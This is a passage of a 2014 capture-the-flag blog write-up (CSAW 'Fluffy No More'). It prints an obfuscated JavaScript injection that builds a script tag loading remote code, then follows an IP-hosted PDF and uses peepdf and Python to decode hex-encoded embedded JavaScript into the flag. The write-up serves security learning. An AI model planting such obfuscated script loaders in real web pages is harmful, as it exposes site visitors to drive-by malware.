</span><span class='line'>              <span class="nx">b</span> <span class="o">=</span> <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cloneNode</span> <span class="o">||</span>
</span><span class='line'>                  <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createDocumentFragment</span> <span class="o">||</span> <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElement</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>          <span class="nx">g</span> <span class="o">=</span> <span class="nx">b</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">g</span> <span class="o">=</span> <span class="nx">j</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">})();</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">elements</span><span class="o">:</span> <span class="nx">k</span><span class="p">.</span><span class="nx">elements</span> <span class="o">||</span> <span class="s2">&quot;abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">version</span><span class="o">:</span> <span class="s2">&quot;3.7.0&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">shivCSS</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span> <span class="o">!==</span> <span class="nx">k</span><span class="p">.</span><span class="nx">shivCSS</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">supportsUnknownElements</span><span class="o">:</span> <span class="nx">g</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">shivMethods</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span> <span class="o">!==</span> <span class="nx">k</span><span class="p">.</span><span class="nx">shivMethods</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">type</span><span class="o">:</span> <span class="s2">&quot;default&quot;</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">shivDocument</span><span class="o">:</span> <span class="nx">q</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">createElement</span><span class="o">:</span> <span class="nx">p</span><span class="p">,</span>
</span><span class='line'>      <span class="nx">createDocumentFragment</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="nx">a</span> <span class="o">||</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">();</span>
</span><span class='line'>          <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span> <span class="o">||</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">),</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">(),</span> <span class="nx">d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">m</span><span class="p">(),</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">d</span> <span class="o">&lt;</span> <span class="nx">h</span><span class="p">;</span> <span class="nx">d</span><span class="o">++</span><span class="p">)</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">e</span><span class="p">[</span><span class="nx">d</span><span class="p">]);</span>
</span><span class='line'>          <span class="k">return</span> <span class="nx">c</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>  <span class="nx">l</span><span class="p">.</span><span class="nx">html5</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span>
</span><span class='line'>  <span class="nx">q</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
</span><span class='line'><span class="p">})(</span><span class="k">this</span><span class="p">,</span> <span class="nb">document</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="s2">&quot;ti&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&quot;HTML Tags&quot;</span><span class="p">;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="s2">&quot;. li colgroup br src datalist script option .&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
</span><span class='line'><span class="nx">c</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">k</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">m</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">length</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nx">v</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'><span class="nx">x</span> <span class="o">=</span> <span class="s2">&quot;\&#39;ht&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">b</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="mi">2541</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">-</span> <span class="mi">35</span> <span class="o">+</span> <span class="mi">46</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">-</span> <span class="mi">15269</span><span class="p">;</span>
</span><span class='line'><span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="p">(</span><span class="mi">56</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">+</span> <span class="mi">68</span> <span class="o">*</span> <span class="mi">65</span> <span class="o">+</span> <span class="mi">41</span> <span class="o">-</span> <span class="mi">548</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class='line'><span class="nx">f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="nx">u</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(((</span><span class="nx">i</span> <span class="o">==</span> <span class="mi">3</span> <span class="o">||</span> <span class="nx">i</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">w</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">((</span><span class="nx">i</span> <span class="o">==</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">w</span> <span class="o">==</span> <span class="mi">2</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="nx">f</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">46</span><span class="p">);</span>
</span><span class='line'>      <span class="nx">w</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nx">f</span> <span class="o">+=</span> <span class="nx">c</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="nx">i</span> <span class="o">=</span> <span class="nx">k</span> <span class="o">+</span> <span class="s2">&quot;anal&quot;</span><span class="p">;</span>
</span><span class='line'><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;&quot;</span> <span class="o">+</span> <span class="nx">m</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">b</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">x</span> <span class="o">+</span> <span class="s2">&quot;tp:&quot;</span> <span class="o">+</span> <span class="nx">k</span> <span class="o">+</span> <span class="nx">k</span> <span class="o">+</span> <span class="nx">f</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="s2">&quot;y&quot;</span> <span class="o">+</span> <span class="nx">g</span> <span class="o">+</span> <span class="s2">&quot;c&quot;</span> <span class="o">+</span> <span class="nx">u</span> <span class="o">+</span> <span class="nx">v</span> <span class="o">+</span> <span class="s2">&quot;j&quot;</span> <span class="o">+</span> <span class="nx">u</span> <span class="o">+</span> <span class="s2">&quot;\&#39;&gt;\&lt;/&quot;</span> <span class="o">+</span> <span class="nx">m</span> <span class="o">+</span> <span class="s2">&quot;\&gt;&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The purpose of this javascript was to redirect the user to the following URL</p>

<pre><code>http://128.238.66.100/announcement.pdf
</code></pre>

<p>upon execution.</p>

<p>The PDF, when opened into a viewer looked as follow:</p>

<p><img class="center" src="/images/2014-09-28/pdf.png"></p>

<p>and at a first look it looked just like an image of a wizard with text on it.</p>

<p>But it for sure was hiding something, the usage of PDF with attached malicious content is very common in waterhole attacks, so why not giving it a closer look with PDF analysis tools like peepdf?</p>

<pre><code># peepdf -i announcement.pdf 
Warning: Spidermonkey is not installed!!
Warning: pylibemu is not installed!!

File: announcement.pdf
MD5: 02794f436a5bb6100e2fe67714cf5933
SHA1: 322e70a561aeee3833145d7f0942c8e32fe24241
Size: 390303 bytes
Version: 1.4
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 9
Streams: 4
Comments: 0
Errors: 0

Version 0:
    Catalog: 6
    Info: 7
    Objects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]
    Streams (4): [1, 2, 3, 8]
        Encoded (4): [1, 2, 3, 8]
    Suspicious elements:
        /Names: [6]
        /EmbeddedFiles: [6]
        /EmbeddedFile: [8]
</code></pre>

<p>Wow, so many objects,  it was really worth looking at it one by one more closely, because in fact in the 8th one we could spot:</p>

<pre><code>PPDF&gt; object 8

&lt;&lt; /Length 212
/Type /EmbeddedFile
/Filter /FlateDecode
/Params &lt;&lt; /Size 495
/Subtype /application/pdf &gt;&gt;
stream
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
endstream
</code></pre>

<p>The hex encoded text looked promising&hellip;</p>

<pre><code># python
Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; print "\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"
YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}
&gt;&gt;&gt;
</code></pre>

<p>So, finally, here was the flag!</p>

<pre><code>key{Those Fluffy Bunnies Make Tummy Bumpy}
</code></pre>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Swappage</span></span>

      




<time class='entry-date' datetime='2014-09-28T16:44:18+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>4:44 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/ctf/'>ctf</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more/" data-via="" data-counturl="http://swappage.github.io/blog/2014/09/28/csaw-2014-fluffy-no-more/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2014/09/24/csaw-2014-saturn-walkthrough/" title="Previous Post: CSAW 2014: saturn walkthrough">&laquo; CSAW 2014: saturn walkthrough</a>
      
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/09/28/csaw-2014-fluffy-no-more/">CSAW 2014: Fluffy No More</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/24/csaw-2014-saturn-walkthrough/">CSAW 2014: Saturn Walkthrough</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/23/hello-world/">Hello World</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Swappage -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
